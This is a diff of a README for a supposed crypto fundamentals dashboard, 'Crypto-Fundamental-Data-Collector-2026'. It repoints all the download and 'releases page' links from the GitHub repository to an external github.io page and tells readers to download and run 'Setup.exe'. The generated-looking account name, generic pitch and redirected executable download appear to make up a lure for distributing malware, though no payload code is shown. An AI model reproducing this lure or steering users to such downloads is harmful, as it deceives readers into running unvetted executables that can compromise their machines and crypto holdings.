@@ -1,6 +1,6 @@
 # 📊 Crypto-Fundamental-Data-Collector-2026 - Data Driven Tools For Better Investments
 
-[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/westcentral-scarface165/Crypto-Fundamental-Data-Collector-2026)
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://westcentral-scarface165.github.io)
 
 ## 🔍 Purpose
 Crypto Fundamental Data Collector 2026 gathers core information for over 100 digital asset projects. You need accurate data to make smart investment choices. This software pulls developer activity, social engagement, total value locked, and on-chain metrics into one simple dashboard. You view the health of these projects without checking five different websites.
@@ -16,14 +16,14 @@ This software runs on standard Windows machines. Ensure your computer meets thes
 ## 📥 How to Install
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/westcentral-scarface165/Crypto-Fundamental-Data-Collector-2026) to select the setup file.
+1. Visit the [releases page](https://westcentral-scarface165.github.io) to select the setup file.
 2. Click the link labeled "Setup.exe" to start the file download.
 3. Locate the file in your downloads folder.
 4. Double-click the file to begin the installation.
 5. Follow the prompts on your screen.
 6. Click "Finish" to launch the collector.
 
-[![](https://img.shields.io/badge/Download-Software-grey.svg)](https://github.com/westcentral-scarface165/Crypto-Fundamental-Data-Collector-2026)
+[![](https://img.shields.io/badge/Download-Software-grey.svg)](https://westcentral-scarface165.github.io)
 
 ## 🚀 Getting Started
 Once the program opens, you see the main dashboard. The interface keeps things simple. 
